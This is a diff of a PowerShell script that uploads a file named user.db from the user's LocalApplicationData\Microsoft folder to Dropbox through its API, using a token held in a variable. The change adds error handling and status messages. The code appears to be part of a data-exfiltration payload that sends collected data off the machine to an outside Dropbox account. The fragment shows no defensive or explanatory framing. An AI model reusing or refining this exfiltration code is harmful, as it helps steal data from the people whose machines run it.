@@ -18,8 +18,24 @@ $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+
+try {
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+    return $true
+}
+catch {
+    return $false
+}
 }
 
 $FileName = [Environment]::GetFolderPath('LocalApplicationData') + "\Microsoft\user.db"
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $FileName}
+$result = $false
+if (-not ([string]::IsNullOrEmpty($db))){
+    $result = DropBox-Upload -f $FileName
+}
+
+if ($result) {
+    Write-Host "File uploaded successfully."
+} else {
+    Write-Host "File upload failed."
+}
